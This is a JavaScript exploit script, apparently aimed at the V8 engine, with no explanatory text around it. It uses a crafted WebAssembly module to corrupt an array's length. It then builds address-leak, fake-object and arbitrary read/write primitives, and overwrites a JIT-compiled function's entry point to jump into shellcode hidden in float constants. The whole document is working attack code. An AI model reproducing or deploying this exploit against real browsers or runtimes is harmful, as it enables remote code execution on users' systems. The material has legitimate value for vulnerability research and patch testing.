const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
const bigUint64 = new BigUint64Array(buf);
f2i = (val) => {
    f64[0] = val;
    return bigUint64[0];
}
i2f = (val) => {
    bigUint64[0] = val;
    return f64[0];
}
d2u = (v) => {
    f64[0] = v;
    return Array.from(u32);
}
u2d = (lo, hi) => {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

hex = (n) => {
    return "0x" + n.toString(16);
}

var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 53, 7, 80, 0, 94, 127, 1, 80, 0, 95, 6, 127, 0, 127, 0, 127, 0, 127, 0, 127, 0, 107, 0, 0, 80, 0, 95, 1, 108, 1, 0, 96, 7, 127, 127, 127, 127, 127, 127, 127, 1, 127, 96, 0, 1, 127, 96, 0, 1, 127, 96, 0, 1, 127, 3, 5, 4, 3, 4, 5, 6, 4, 12, 1, 64, 0, 107, 2, 1, 2, 2, 251, 8, 2, 11, 6, 22, 4, 108, 0, 1, 208, 0, 11, 127, 1, 65, 0, 11, 127, 1, 65, 0, 11, 127, 1, 65, 0, 11, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 128, 1, 4, 78, 0, 65, 0, 37, 0, 251, 3, 2, 0, 251, 3, 1, 5, 36, 0, 32, 0, 36, 1, 32, 1, 36, 2, 32, 2, 36, 3, 16, 3, 4, 64, 32, 3, 36, 2, 32, 4, 36, 3, 16, 3, 4, 64, 32, 5, 36, 2, 32, 6, 36, 3, 16, 3, 4, 64, 35, 2, 15, 11, 11, 11, 35, 0, 35, 2, 65, 9, 106, 65, 128, 128, 1, 251, 22, 0, 35, 2, 11, 12, 0, 35, 0, 35, 2, 251, 19, 0, 35, 1, 107, 11, 14, 0, 35, 2, 65, 1, 106, 36, 2, 35, 2, 35, 3, 78, 11, 19, 0, 3, 64, 16, 2, 4, 64, 65, 1, 15, 11, 16, 1, 13, 0, 11, 65, 0, 11]);

const foo = () => {
    return [
        1.9711828979523134e-246,
        1.9562205631094693e-246,
        1.9557819155246427e-246,
        1.9711824228871598e-246,
        1.971182639857203e-246,
        1.9711829003383248e-246,
        1.9895153920223886e-246,
        1.971182898881177e-246
    ];
}
for (let i = 0; i < 0x10000; i++) {
    foo(); foo(); foo(); foo();
}

var wasm_module = new WebAssembly.Module(wasm_code);
var instance = new WebAssembly.Instance(wasm_module);
var oobArr = [1.951234, 1.951234, 1.951234]; // 0x3FFF3841 248D7E02
var doubleArr = [1.1, 2.2, 3.3, 4.4];
var objArr = [doubleArr, doubleArr];

console.log("==> Before Wasm Hack, oobArr's length: " + hex(oobArr.length));
console.log("==> Find the offset is: 0x" + instance.exports.main(0x248D7E02, 0x10000, 0x50000, 0x90000, 0xcf000, 0x60000, 0x7f000).toString(16));
console.log("==> After Wasm Hack, oobArr's length: " + hex(oobArr.length));

let doubleMap = d2u(oobArr[8])[0];
let objMap = d2u(oobArr[18])[0];
console.log("==> double_map: " + hex(doubleMap));
console.log("==> obj_map: " + hex(objMap));

addrOf = (obj) => {
    objArr[0] = obj;
    oobArr[18] = i2f(BigInt(doubleMap));
    ret = d2u(objArr[0]);
    oobArr[18] = i2f(BigInt(objMap));
    return ret[0];
}

var fakeAddr = addrOf(doubleArr) + 0x30;

doubleArr[2] = u2d(doubleMap, 0);
doubleArr[3] = u2d(0, 0x1000);

fakeObj = (addr) => {
    doubleArr[0] = u2d(addr, 0);
    oobArr[8] = i2f(BigInt(objMap));
    var fake_obj = doubleArr[0];
    oobArr[8] = i2f(BigInt(doubleMap));
    return fake_obj;
}

var fake_obj = fakeObj(fakeAddr);

arb_r = (addr) => {
    doubleArr[3] = u2d(addr - 0x8, 0x1000);
    return f2i(fake_obj[0]);
}
arb_w = (addr, value) => {
    doubleArr[3] = u2d(addr - 0x8, 0x1000);
    fake_obj[0] = value;
}

var instance_addr = addrOf(instance);
var foo_addr = addrOf(foo);
console.log("==> foo_addr: " + hex(foo_addr));

var code_addr = arb_r(foo_addr + 0x18) & 0xffffffffn;
console.log("==> code_addr: " + hex(code_addr));

var code_entry_point_addr = arb_r(Number(code_addr) + 0x10);
console.log("==> code_entry_point_addr: " + hex(code_entry_point_addr));

arb_w(Number(code_addr) + 0x10, i2f(code_entry_point_addr + 0x53n));
foo();